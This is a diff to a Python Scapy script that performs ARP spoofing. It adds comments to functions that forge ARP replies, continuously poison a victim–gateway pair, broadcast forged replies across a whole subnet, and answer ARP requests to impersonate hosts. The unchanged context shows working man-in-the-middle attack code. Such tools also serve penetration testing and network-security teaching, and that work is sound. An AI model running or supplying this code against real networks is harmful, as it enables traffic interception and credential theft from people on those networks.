@@ -37,7 +37,12 @@ def _u(s):
     except NameError:
         return s
 
+#packet crafting: build a single Ethernet/ARP reply (op=2)
 def craft(is_at_mac, dst_ip, dst_mac, src_ip):
+    #is_at_mac: the MAC adress to claim in this ARP reply
+    #dst_ip: target IP whose ARP table we poison
+    #dst_mac: target's real MAC (destination Ethernet)
+    #src_ip: the IP address we're impersonating
     return (
         Ether(src=is_at_mac, dst=dst_mac) /
         ARP(op=2, psrc=src_ip, hwsrc=is_at_mac, pdst=dst_ip, hwdst=dst_mac)
@@ -49,14 +54,14 @@ def resolve_mac(ip):
         raise RuntimeError("Could not resolve MAC for %s – host down?" % ip)
     return mac
 
+#ActivePairSpoofer:thread that continuously poisons one <victim, gateway> pair
 class ActivePairSpoofer(threading.Thread):
-    """Periodic two-way poisoning of one <victim, gateway> pair."""
     def __init__(self, iface, victim, gateway, att_mac, interval=10.0):
         threading.Thread.__init__(self)
         self.daemon = True   
         self.iface, self.victim, self.gateway = iface, victim, gateway
         self.att_mac, self.sleep, self._run = att_mac, interval, True
-
+    #Send two ARP replies: tell victim we are gateway, and vice versa
     def _spoof_once(self):
         v_ip, v_mac = self.victim
         g_ip, g_mac = self.gateway
@@ -66,7 +71,7 @@ class ActivePairSpoofer(threading.Thread):
         # I am victim → GW
         sendp(craft(self.att_mac, g_ip, g_mac, v_ip),
               iface=self.iface, verbose=False)
-
+    #restore correct MAC-IP bindings by sending legit reply
     def _restore_once(self):
         v_ip, v_mac = self.victim
         g_ip, g_mac = self.gateway
@@ -85,16 +90,16 @@ class ActivePairSpoofer(threading.Thread):
 
     def stop(self): self._run = False
 
-
+#floodSpoofer:thread that poisons entire subnet by broadcasting ARP replyes
 class FloodSpoofer(threading.Thread):
-    """Broadcast forged replies for *every* IP in a CIDR."""
+    #broadcast forged replies for *every* IP in a CIDR
     def __init__(self, iface, cidr, gw_ip, att_mac, interval=10.0):
         threading.Thread.__init__(self)
         self.daemon = True   
         self.iface = iface
         self.cidr  = ipaddress.ip_network(_u(cidr), strict=False)
         self.gw_ip, self.att_mac, self.sleep, self._run = gw_ip, att_mac, interval, True
-
+    #loop through every usable IP in the subnet and broadcast reply
     def _spoof_once(self):
         for ip in self.cidr.hosts():
             sendp(craft(self.att_mac, str(ip), "ff:ff:ff:ff:ff:ff", self.gw_ip),
@@ -107,9 +112,9 @@ class FloodSpoofer(threading.Thread):
             time.sleep(self.sleep)
     def stop(self): self._run = False
 
-
+#silentResponder: thread that passively answers ARP who-has requests
 class SilentResponder(threading.Thread):
-    """Only answers ARP who-has for victim / gateway."""
+    #only answers ARP who-has for victim / gateway
     def __init__(self, iface, victim, gateway, att_mac):
         threading.Thread.__init__(self)
         self.daemon = True   
